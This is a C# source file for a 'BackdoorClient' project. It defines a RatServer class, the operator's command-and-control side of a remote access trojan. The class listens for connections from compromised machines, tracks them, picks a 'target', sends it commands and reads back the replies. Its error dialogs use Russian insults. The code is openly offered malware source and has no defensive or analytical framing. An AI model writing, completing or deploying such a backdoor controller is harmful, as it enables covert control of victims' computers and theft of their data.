using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace BackdoorClient
{
    public class RatServer
    {
        public Action OnClientConnect = null;
        public Action OnClientDisсonnect = null;
        public Action<Socket> OnSetTarget = null;
        public List<Socket> connection { get; private set; } = new List<Socket>();

        private Socket target = null;
        private Socket sockBinder;
        private bool isListen = false;
        private Thread threadHandleConnections = null;
        private Thread threadHandleDisconnections = null;
        private string ip;
        private int port;

        public RatServer()
        {
        }

        public RatServer(string ipAdr, int portSock)
        {
            ip = ipAdr;
            port = portSock;
            Listen();
        }


        public RatServer(string ipAdr, int portSock, Action onClientConnect, Action onClientDisconnect = null)
        {
            ip = ipAdr;
            port = portSock;
            onClientConnect += onClientConnect;
            OnClientDisсonnect += onClientDisconnect;
            Listen();
        }

        ~RatServer()
        {
            threadHandleConnections.Abort();
            threadHandleDisconnections.Abort();
            for (int i = 0; i < connection.Count; i++)
            {
                connection[i].Close();
                connection[i].Dispose();
            }
        }

        public void SetTarget(int indexInConnection)
        {
            try
            {
                target = connection[indexInConnection];
                OnSetTarget?.Invoke(target);
            }
            catch (Exception)
            {
            }
        }

        public void DestroyServer()
        {
            if (threadHandleConnections != null &&
              threadHandleDisconnections != null)
            {
                
                sockBinder.Close();
                sockBinder.Dispose();
                threadHandleConnections.Abort();
                threadHandleDisconnections.Abort();
            }
            for (int i = 0; i < connection.Count; i++)
            {
                try
                {
                    //connection[i].Send(Encoding.UTF8.GetBytes("abort connection"));
                    SendDataToClient("abort connection", i);
                    connection[i].Receive(new byte[100000]);
                }
                catch
                { }
                connection[i].Close();
            }
        }

        private void Listen()
        {
            if (isListen) return;
            isListen = true;
            threadHandleConnections = new Thread(HandleConnections);
            threadHandleConnections.Start();

            threadHandleDisconnections = new Thread(HandleDisconnections);
            threadHandleDisconnections.Start();
        }

        private void StopListen()
        {
            if (threadHandleConnections == null || threadHandleDisconnections == null) return;
            threadHandleConnections.Abort();
            threadHandleDisconnections.Abort();
        }


        private void HandleConnections()
        {
            while (true)
            {
                Thread.Sleep(100);
                sockBinder = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(ip), port);

                sockBinder.Bind(ipEndPoint);


                sockBinder.Listen(1);

                var conn = sockBinder.Accept();
                connection.Add(conn);
                if (connection.Count == 1) SetTarget(0);
                OnClientConnect?.Invoke();

                sockBinder.Dispose();
            }
        }

        private void HandleDisconnections()
        {
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < connection.Count; i++)
                {
                    try
                    {
                        //connection[i].Send(Encoding.UTF8.GetBytes("test_connect"));
                        SendDataToClient("test_connect", i);
                        continue;
                    }
                    catch
                    {

                    }
                    if (!connection[i].Connected)
                    {
                        connection[i].Dispose();
                        connection.Remove(connection[i]);
                        OnClientDisсonnect?.Invoke();
                    }
                }
            }
        }

        public void SendDataToClient(string data, int clientIndex = -1)
        {
            char[] stringSize = new char[10];
            int size = Encoding.UTF8.GetBytes(data).Length;

            for (int i = 0; i < size.ToString().Length; i++)
            {
                stringSize[i] = size.ToString()[i];
            }
            byte[] buffer = Encoding.UTF8.GetBytes(new string(stringSize) + data);
            Console.Write($"На сервер отправлено {buffer.Length} байт, указано в заголвке {new string(stringSize)}");
            if (clientIndex == -1) target.Send(buffer); else connection[clientIndex].Send(buffer);
        }

        public byte[] ReceiveDataFromClient()
        {
            var bytesSize = new byte[10];

            target.Receive(bytesSize);
            int size = int.Parse(Encoding.UTF8.GetString(bytesSize));

            byte[] bytes = new byte[size];

            int offset = 0;
            int remaining = size;
            while (remaining > 0)
            {
                int read = target.Receive(bytes, offset, remaining, SocketFlags.None);//stream.Read(data, offset, remaining);
                if (read <= 0)
                    throw new System.IO.EndOfStreamException
                        (String.Format("End of stream reached with {0} bytes left to read", remaining));
                remaining -= read;
                offset += read;
            }
            return bytes;
        }

        public string SendCommandAndGetResponce(string comm, int maxsize = 10000)
        {

            try
            {
                SendDataToClient(comm);
            }
            catch (Exception)
            {
                MessageBox.Show("Дебил, нет связи подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return "";
            }

            byte[] bytes = ReceiveDataFromClient();

            return Encoding.UTF8.GetString(bytes);
        }

        public byte[] SendCommandAndGetBytesResponce(string comm, int maxsize = 10000)
        {

            try
            {
                SendDataToClient(comm);
            }
            catch (Exception e)
            {
                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return new byte[1];
            }

            byte[] bytes = ReceiveDataFromClient();

            return bytes;
        }
    }
}